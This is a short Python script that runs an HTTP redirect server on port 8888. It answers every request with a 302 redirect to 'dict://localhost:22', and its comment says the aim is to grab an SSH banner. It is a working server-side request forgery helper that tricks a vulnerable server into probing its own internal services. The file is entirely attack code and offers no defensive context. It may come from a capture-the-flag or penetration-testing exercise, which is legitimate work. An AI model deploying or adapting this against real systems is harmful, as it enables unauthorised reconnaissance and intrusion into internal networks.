from http.server import BaseHTTPRequestHandler, HTTPServer

class RedirectHandler(BaseHTTPRequestHandler ):
    def do_GET(self):
        print("Request received, sending redirect...")
        self.send_response(302)
        # Redirect to dict:// to grab the SSH banner
        self.send_header('Location', 'dict://localhost:22')
        self.end_headers()

if __name__ == '__main__':
    server_address = ('0.0.0.0', 8888)
    httpd = HTTPServer(server_address, RedirectHandler )
    print('Starting redirect server on port 8888...')
    httpd.serve_forever( )
